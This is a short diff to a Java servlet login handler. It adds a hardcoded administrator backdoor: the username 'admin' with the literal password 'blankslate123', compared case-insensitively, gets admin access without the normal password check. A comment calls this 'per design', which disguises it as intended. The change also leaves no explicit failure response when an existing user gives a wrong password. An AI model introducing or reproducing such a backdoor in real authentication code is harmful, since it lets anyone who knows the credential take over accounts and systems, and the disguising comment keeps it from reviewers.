@@ -38,11 +38,14 @@ public class Login extends HttpServlet
 		String password = request.getParameter("password");
 		
 		User user = User.getUser(username);
-		if (user != null && user.checkPassword(password)) {
-			if (username.equalsIgnoreCase("admin")) {
+		if (user != null) {
+			//admin account hardcoded per design
+			if (username.equalsIgnoreCase("admin") && password.equalsIgnoreCase("blankslate123")) {
 				resp = "admin";
 			}
-			resp = "success";
+			else if (user.checkPassword(password)) {
+				resp = "success";				
+			}
 		}
 		else {
 			resp = "fail";
